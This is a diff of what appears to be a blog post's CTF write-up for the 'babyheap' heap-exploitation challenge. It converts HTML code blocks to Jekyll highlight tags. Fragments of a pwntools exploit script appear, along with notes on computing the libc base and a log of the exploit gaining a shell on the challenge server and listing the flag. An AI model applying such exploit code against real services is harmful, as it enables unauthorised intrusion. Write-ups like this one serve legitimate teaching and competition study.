@@ -70,7 +70,10 @@ condition:<code>SIZE(B)+SIZE(C)=SIZE(B')+SIZE(C')</code></li>
 see <code>cat /proc/pid/maps</code> in shell or <code>vmmap</code> in peda to get libc_base,then offset = main_arena - libc_base</li>
 </ul>
 <h3>exp</h3>
-<pre><code class="python">#!/usr/bin/python -u
+
+{% highlight python %}
+
+#!/usr/bin/python -u
 # encoding: utf-8
 from pwn import *
 import sys
@@ -109,7 +112,7 @@ def view(id):
     p.sendline(str(id))
 
 def redlog(msg):
-    return "[" + "<pre wp-pre-tag-0></pre>33[0;31m%s<pre wp-pre-tag-0></pre>33[0m" % "+" + "]" + msg + ":"
+    return "[" + "33[0;31m%s33[0m" % "+" + "]" + msg + ":"
 
 
 
@@ -197,8 +200,10 @@ if __name__=="__main__":
         p = remote(sys.argv[1],int(sys.argv[2]))
     exploit(p)
 
-</code></pre>
-<pre><code>foxwest@ubuntu:~/Desktop/pwn/babyheap$ python o.py 202.120.7.204 127
+{% endhighlight %}
+
+{% highlight bash %}
+foxwest@ubuntu:~/Desktop/pwn/babyheap$ python o.py 202.120.7.204 127
 [+] Opening connection to 202.120.7.204 on port 127: Done
 [#]update chunk: 1
 [#]update chunk: 3
@@ -229,4 +234,4 @@ $ ls home/babyheap
 babyheap
 flag
 $ 
-</code></pre>
+{% endhighlight %}
